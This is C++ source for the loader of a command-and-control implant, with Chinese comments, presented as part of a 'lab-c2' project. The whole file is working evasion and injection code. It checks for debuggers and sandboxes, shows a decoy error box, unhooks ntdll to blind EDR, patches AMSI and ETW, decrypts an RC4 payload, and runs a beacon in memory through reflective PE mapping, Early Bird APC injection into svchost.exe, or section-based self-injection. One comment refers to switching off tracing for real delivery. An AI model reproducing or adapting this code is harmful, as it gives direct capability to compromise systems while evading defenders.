// lab-c2/implant/loader.cpp - 载体: 反沙箱/反调试 -> 解密 -> 内存加载(不落地)
// 构建: build.bat [payload] [force|quiet]
//   payload 默认 build\beacon.exe (PE -> 反射式映射, 不需要 donut)
//   force   = /DLCS_FORCE_RUN: 门槛只落痕不拦截(靶场连通性验证专用)
//
// payload.h 由 tools/enc.py 生成(载荷可以是 PE 也可以是 shellcode):
//   g_shellcode[]  RC4 密文    g_key[]/g_keyLen

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>
#include <string>
#include <cstdio>
#include <cstring>
#include "syscall.hpp"
#include "ekko.hpp"
#include "payload.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ================================================================== 阶段追踪
// 为什么需要它: runProgramInGuest 不回显 stdout, 进程被吊住时完全没有可见性。
// 每个关键阶段追加一行到固定文件, 用 VIX pull 回来取证 —— 定位"卡在哪一步"最快的手段。
// 正式投递时把这个开关关掉(或换成只写内存), 靶场里全开。
#ifndef LCS_TRACE_PATH
#define LCS_TRACE_PATH "C:\\Users\\Public\\lcs_trace.log"
#endif

static void Trace(const char* stage, const char* detail = nullptr) {
    HANDLE h = CreateFileA(LCS_TRACE_PATH, FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st{};
    GetLocalTime(&st);
    char buf[320];
    int n = snprintf(buf, sizeof(buf), "%02d:%02d:%02d.%03d pid=%lu %s%s%s\r\n",
                     st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                     (unsigned long)GetCurrentProcessId(), stage,
                     detail ? " | " : "", detail ? detail : "");
    DWORD wr = 0;
    WriteFile(h, buf, (DWORD)n, &wr, nullptr);
    CloseHandle(h);          // 每条立即落盘: 进程被强杀也不丢证据
}

// ================================================================== 环境检测(打分模型 v2)
// 演进记录(全部是实测踩出来的):
//   v0 单项命中即拦 -> 自家 1 vCPU 靶机被 cpu<2 直接误判, 一进门就走诱饵分支。
//   v1 弱指标累计到阈值(2) -> 靶机刚重启时 cpu<2(1)+uptime<10min(1)=2 又正好顶到阈值,
//      再次误判, 16:32 实测日志: "GATE-SANDBOX | score=2/2 cpu<2(1)+uptime<10min(1)"。
//   v2 现在: 弱指标再怎么堆也不单独成罪, 必须"弱分达阈值(默认3) 或 任一强指标命中";
//      强指标(沙箱 DLL / 分析机主机名)单项即拦。阈值 /DLCS_SANDBOX_THRESHOLD=n 可覆盖。
#ifndef LCS_SANDBOX_THRESHOLD
#define LCS_SANDBOX_THRESHOLD 3
#endif

static int SandboxScore(char* why, size_t whyLen, int* strongOut) {
    int score = 0;
    int strong = 0;
    if (why && whyLen) why[0] = 0;
    auto add = [&](int weight, const char* name) {
        score += weight;
        if (weight >= 3) ++strong;
        if (why && whyLen) {
            size_t cur = strlen(why);
            if (cur + 1 < whyLen)
                snprintf(why + cur, whyLen - cur, "%s%s(%d)", cur ? "+" : "", name, weight);
        }
    };

    // 1) 资源门槛(弱): VM 天然会中招, 单独不足以判定
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) add(1, "cpu<2");

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ull * 1024 * 1024 * 1024)
        add(1, "mem<2G");

    if (GetTickCount64() < 10ull * 60 * 1000) add(1, "uptime<10min");

    // 2) 沙箱/分析工具注入的模块(强)
    const wchar_t* mods[] = {
        L"sbiedll.dll", L"dbghelp.dll", L"cmdvrt32.dll", L"api_log.dll",
        L"dir_watch.dll", L"pstorec.dll", L"vmcheck.dll", L"wpespy.dll",
        L"SxIn.dll", L"avghookx.dll", L"snxhk.dll"
    };
    for (auto m : mods) {
        if (GetModuleHandleW(m)) {
            add(3, "sandbox-module");
            break;
        }
    }

    // 3) 交互痕迹(弱)
    CURSORINFO ci{};
    ci.cbSize = sizeof(ci);
    if (GetCursorInfo(&ci)) {
        if (!(ci.flags & CURSOR_SHOWING) && ci.ptScreenPos.x == 0 && ci.ptScreenPos.y == 0)
            add(1, "no-cursor-trace");
    }
    if (GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768)
        add(1, "screen-too-small");

    // 4) 已知分析机主机名(强)
    wchar_t buf[64] = { 0 };
    DWORD n = 64;
    GetComputerNameW(buf, &n);
    std::wstring cn = buf;
    const wchar_t* bad[] = { L"SANDBOX", L"MALWARE", L"CUCKOO", L"WIRETEST",
                             L"VIRUS", L"TEQUILA", L"ANALYSIS", L"JOEBOX" };
    for (auto b : bad) {
        if (cn.find(b) != std::wstring::npos) {
            add(3, "hostname-blacklist");
            break;
        }
    }

    if (strongOut) *strongOut = strong;
    return score;
}

static const char* DebugReason() {
    if (IsDebuggerPresent()) return "IsDebuggerPresent";

    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    if (dbg) return "remote-debugger";

    if (sc::IsBeingDebugged()) return "PEB.BeingDebugged";

    // 硬件断点: 调试器常用 Dr0-Dr3
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx) &&
        (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)) return "hardware-breakpoint";

    return nullptr;
}

// 触发检测时走无害分支, 拖慢分析而不是打草惊蛇。
// 实测坑(2026-10-04): MessageBoxW 是模态的, 无人值守桌面上会把进程永久吊住 ——
// 连 runProgramInGuest 都跟着挂死(子进程在作业对象里)。这里改成硬超时弹窗, 拿不到
// MessageBoxTimeoutW 就退化成 Sleep, 任何情况下都不允许"卡死"。
static void Decoy() {
    typedef int(WINAPI * tMBT)(HWND, LPCWSTR, LPCWSTR, UINT, WORD, DWORD);
    HMODULE u = GetModuleHandleW(L"user32.dll");
    if (u) {
        auto mbt = (tMBT)GetProcAddress(u, "MessageBoxTimeoutW");
        if (mbt) {
            mbt(nullptr, L"缺少运行库组件，请重新安装。", L"错误", MB_ICONERROR, 0, 8000);
            return;
        }
    }
    Sleep(8000);
}

// 门槛命中后的行为: 默认拦截; LCS_FORCE_RUN 下只落痕, 用于把链路问题与门槛误判分开定位
#ifdef LCS_FORCE_RUN
#define GATE_HIT(kind, why) do { Trace(kind, why); } while (0)
#else
#define GATE_HIT(kind, why) do { Trace(kind, why); Decoy(); return 0; } while (0)
#endif

// ================================================================== 注入通道 A: Early Bird APC
// 挂起进程 -> 分配 RW -> 写 shellcode -> 改 RX -> 排队 APC -> 恢复线程
// 相比 CreateRemoteThread, 不会出现远程线程创建事件; 相比线程劫持, 不用挂起他人线程
static bool EarlyBird(const BYTE* sc, SIZE_T len, const wchar_t* image) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring cmd = image;
    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        Trace("EARLYBIRD fail", "CreateProcessW");
        return false;
    }

    PVOID mem = nullptr;
    SIZE_T sz = len;
    if (sc::Call("NtAllocateVirtualMemory", (HANDLE)pi.hProcess, &mem, (ULONG_PTR)0, &sz,
                 (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE) != 0) {
        Trace("EARLYBIRD fail", "NtAllocateVirtualMemory");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    if (sc::Call("NtWriteVirtualMemory", (HANDLE)pi.hProcess, mem, (PVOID)sc,
                 (SIZE_T)len, (PSIZE_T)nullptr) != 0) {
        Trace("EARLYBIRD fail", "NtWriteVirtualMemory");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    ULONG old = 0;
    if (sc::Call("NtProtectVirtualMemory", (HANDLE)pi.hProcess, &mem, &sz,
                 (ULONG)PAGE_EXECUTE_READ, &old) != 0) {
        Trace("EARLYBIRD fail", "NtProtectVirtualMemory");
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    Trace("EARLYBIRD ok", "APC queued");
    return true;
}

// ================================================================== 注入通道 B: 无模块自注入
// NtCreateSection + NtMapViewOfSection: 内存由内核 section 支撑, 磁盘无文件,
// 且不会在进程里出现 MZ 头(可选: 抹掉 PE 头)
static void SelfInject(const BYTE* sc, SIZE_T len) {
    HANDLE hSec = nullptr;
    LARGE_INTEGER maxSz{};
    maxSz.QuadPart = (LONGLONG)len;
    if (sc::Call("NtCreateSection", (PHANDLE)&hSec, (ACCESS_MASK)SECTION_ALL_ACCESS,
                 (PVOID)nullptr, (PLARGE_INTEGER)&maxSz,
                 (ULONG)PAGE_EXECUTE_READWRITE, (ULONG)SEC_COMMIT, (HANDLE)nullptr) != 0) {
        Trace("SELFINJECT fail", "NtCreateSection");
        return;
    }

    PVOID base = nullptr;
    SIZE_T view = 0;
    if (sc::Call("NtMapViewOfSection", hSec, (HANDLE)-1, &base, (ULONG_PTR)0, (SIZE_T)0,
                 (PLARGE_INTEGER)nullptr, &view, (DWORD)2 /*ViewUnmap*/, (ULONG)0,
                 (ULONG)PAGE_EXECUTE_READWRITE) != 0) {
        Trace("SELFINJECT fail", "NtMapViewOfSection");
        return;
    }

    memcpy(base, sc, len);
    Trace("SELFINJECT ok", "calling payload");
    ((void(*)())base)();
}

// ================================================================== 载荷解包
// 注意(实测坑): build.bat 带 /MERGE:.rdata=.text, g_shellcode 落在只读可执行页上,
// 原地 RC4 解密 = 写入 RX 页 = 直接 AV。所以必须先复制到 RW 堆, 一切改写只在堆上做。
static BYTE* DecryptPayload(SIZE_T* outLen) {
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, g_scLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return nullptr;
    memcpy(buf, g_shellcode, g_scLen);
    ekko::Rc4(buf, g_scLen, g_key, g_keyLen);
    *outLen = g_scLen;
    return buf;
}

// ================================================================== 注入通道 C: 反射式 PE 映射(载荷是 exe 时走这条)
// 这条通道的存在意义: 不需要 Donut/sRDI —— 直接把加密的 beacon.exe 当载荷,
// 在内存里完成映射(拷段 -> 重定位 -> 修导入 -> 建线程跑入口点), 磁盘上永远没有
// 解密后的 PE。x64 exe 的入口点是 mainCRTStartup, CRT 自己会再调 main。
static bool MapFail(const char* why) {
    Trace("MAP fail", why);
    return false;
}

static bool MapPeAndRun(BYTE* pe, SIZE_T len) {
    if (len < sizeof(IMAGE_DOS_HEADER)) return MapFail("too-small");
    auto dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return MapFail("DOS-magic");
    if ((SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > len) return MapFail("e_lfanew-oob");
    auto nt = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return MapFail("NT-signature");
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return MapFail("not-x64");

    const SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    const SIZE_T hdrSize = nt->OptionalHeader.SizeOfHeaders;
    BYTE* b = nullptr;

    // 1) 按镜像大小分配(走直接系统调用, 不经过被挂钩的 ntdll 用户态桩)
    PVOID base = nullptr;
    SIZE_T sz = imgSize;
    if (sc::Call("NtAllocateVirtualMemory", (HANDLE)-1, &base, (ULONG_PTR)0, &sz,
                 (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE) != 0)
        return MapFail("NtAllocateVirtualMemory");
    b = (BYTE*)base;

    // 2) 头 + 各段按 VirtualAddress 落位
    memcpy(b, pe, hdrSize);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!sec->SizeOfRawData) continue;
        if ((SIZE_T)sec->PointerToRawData + sec->SizeOfRawData > len) return MapFail("section-oob");
        memcpy(b + sec->VirtualAddress, pe + sec->PointerToRawData, sec->SizeOfRawData);
    }
    Trace("MAP sections-ok");

    // 3) 重定位: 实际基址几乎不可能等于 preferred ImageBase, 必做
    const LONGLONG delta = (LONGLONG)((ULONG_PTR)b - (ULONG_PTR)nt->OptionalHeader.ImageBase);
    auto rel = nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC;
    if (delta != 0 && rel->Size) {
        auto r = (PIMAGE_BASE_RELOCATION)(b + rel->VirtualAddress);
        BYTE* rEnd = (BYTE*)r + rel->Size;
        while ((BYTE*)r < rEnd && r->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
            DWORD n = (r->SizeOfBlock - (DWORD)sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* item = (WORD*)(r + 1);
            for (DWORD k = 0; k < n; ++k, ++item) {
                if ((*item >> 12) == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(b + r->VirtualAddress + (*item & 0x0FFF)) += (ULONG_PTR)delta;
            }
            r = (PIMAGE_BASE_RELOCATION)((BYTE*)r + r->SizeOfBlock);
        }
    }
    Trace("MAP reloc-ok");

    // 4) 导入表: 模块名/函数名直接用载荷自带的字符串, 不引入新的静态特征
    auto imp = nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT;
    if (imp->Size) {
        auto d = (PIMAGE_IMPORT_DESCRIPTOR)(b + imp->VirtualAddress);
        for (; d->Name; ++d) {
            HMODULE m = LoadLibraryA((const char*)(b + d->Name));
            if (!m) return MapFail("LoadLibrary");
            auto oft = (PIMAGE_THUNK_DATA)(b + (d->OriginalFirstThunk ? d->OriginalFirstThunk
                                                                      : d->FirstThunk));
            auto ft = (PIMAGE_THUNK_DATA)(b + d->FirstThunk);
            for (; oft->u1.AddressOfData; ++oft, ++ft) {
                if (oft->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                    ft->u1.Function = (ULONG_PTR)GetProcAddress(
                        m, (LPCSTR)(ULONG_PTR)(oft->u1.Ordinal & 0xFFFF));
                else {
                    auto ibn = (PIMAGE_IMPORT_BY_NAME)(b + oft->u1.AddressOfData);
                    ft->u1.Function = (ULONG_PTR)GetProcAddress(m, (LPCSTR)ibn->Name);
                }
            }
        }
    }
    Trace("MAP imports-ok");

    // 5) 段权限按 Characteristics 还原(整镜像一律 RX 会让 .data 写入 AV)
    BYTE* eps = b + nt->OptionalHeader.AddressOfEntryPoint;
    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        SIZE_T psz = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        if (!psz) continue;
        DWORD ch = sec->Characteristics;
        DWORD prot = (ch & IMAGE_SCN_MEM_EXECUTE)
                         ? ((ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ)
                         : ((ch & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY);
        PVOID pb = b + sec->VirtualAddress;
        ULONG old = 0;
        sc::Call("NtProtectVirtualMemory", (HANDLE)-1, &pb, &psz, (ULONG)prot, &old);
    }

    // 6) 镜像已拷完, 把磁盘载荷在内存里的第二份明文擦掉再起线程
    SecureZeroMemory(pe, len);
    Trace("MAP protections-ok", "cleartext payload wiped, starting thread");

    HANDLE th = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)eps, nullptr, 0, nullptr);
    if (!th) return MapFail("CreateThread");
    Trace("MAP thread-started", "waiting on beacon (forever-loop)");
    WaitForSingleObject(th, INFINITE);       // 信标是常驻循环, 正常情况下永不返回
    Trace("MAP thread-exited", "beacon returned");
    CloseHandle(th);
    return true;
}

// ================================================================== main
int main() {
    // 单实例守卫 v3（2026-10-04 再修）:
    // v2 按机器级互斥, 结果**会话 0 的弱实例把交互会话的强实例挡掉了** —— 而会话 0 那个
    // 实例由计划任务拉起, 环境里没有 PATH, 连子进程都创建不了(实测 "CreateProcess 失败")。
    // 改成按会话隔离: 每个登录会话各留一个实例, 由信标侧的 sid 区分, 互不顶替。
    DWORD sessId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessId);
    char mutexName[64];
    snprintf(mutexName, sizeof(mutexName), "Global\\lcs_lab_singleton_%lu",
             (unsigned long)sessId);
    HANDLE once = CreateMutexA(nullptr, TRUE, mutexName);
    const DWORD merr = GetLastError();
    if (once && merr == ERROR_ALREADY_EXISTS) {
        Trace("singleton", "already running in this session (exists) -> exit");
        return 0;
    }
    if (!once && merr == ERROR_ACCESS_DENIED) {
        Trace("singleton", "already running in this session (access denied) -> exit");
        return 0;
    }

    Trace("== start");
#ifdef LCS_FORCE_RUN
    Trace("build mode", "LCS_FORCE_RUN (gates log-only)");
#endif

    if (const char* d = DebugReason()) GATE_HIT("GATE-DEBUG", d);

    char why[256];
    int strong = 0;
    const int score = SandboxScore(why, sizeof(why), &strong);
    if (strong > 0 || score >= LCS_SANDBOX_THRESHOLD) {
        char det[320];
        snprintf(det, sizeof(det), "strong=%d score=%d/%d %s", strong, score,
                 LCS_SANDBOX_THRESHOLD, why);
        GATE_HIT("GATE-SANDBOX", det);
    } else if (score > 0) {
        char det[320];
        snprintf(det, sizeof(det), "strong=0 weak=%d/%d %s (pass)", score,
                 LCS_SANDBOX_THRESHOLD, why);
        Trace("sandbox-signals", det);
    }
    Trace("gates passed");

    // 1) 反 EDR 用户态钩子: 用一份干净的 ntdll .text 覆盖当前进程
    Trace("ntdll unhook", sc::UnhookNtdll() ? "ok" : "fail");

    // 2) 抹掉当前进程的 AMSI(走脚本/.NET 分支时需要) 与 ETW 事件上报
    Trace("patch AMSI", sc::PatchAMSI() ? "ok" : "amsi-not-loaded");
    Trace("patch ETW", sc::PatchETW() ? "ok" : "fail");

    // 3) 解包载荷(与 tools/enc.py 同参 RC4), 只落在堆上
    SIZE_T len = 0;
    BYTE* payload = DecryptPayload(&len);
    if (!payload) {
        Trace("decrypt FAILED");
        return 0;
    }
    {
        char b[96];
        snprintf(b, sizeof(b), "decrypted=%lu bytes magic=%02X%02X",
                 (unsigned long)len,
                 len > 1 ? payload[0] : 0, len > 1 ? payload[1] : 0);
        Trace("payload", b);
    }

    // 4) 可选: 注入前先把载荷藏进密文窗口, 拖过沙箱的行为主循环
    //    注意: 只加密数据区; 要连自身代码一起藏, 用 ekko 头文件里的 Ekko 全量版
    // ekko::SleepMask(payload, len, 8000, g_key, g_keyLen);

    // 5) 按载荷形态选通道: MZ = PE(反射式映射到本进程) / 其它 = shellcode(早鸟 APC)
    if (len > 2 && payload[0] == 'M' && payload[1] == 'Z') {
        Trace("path", "PE -> reflective map");
        if (MapPeAndRun(payload, len)) return 0;
        Trace("path", "map failed -> fallback SelfInject");
        SelfInject(payload, len);
    } else {
        Trace("path", "shellcode -> EarlyBird APC");
        wchar_t root[MAX_PATH] = { 0 };
        GetEnvironmentVariableW(L"SystemRoot", root, MAX_PATH);
        std::wstring target = std::wstring(root) + L"\\System32\\svchost.exe";
        if (EarlyBird(payload, len, target.c_str())) return 0;
        SelfInject(payload, len);
    }

    Trace("== exit");
    return 0;
}
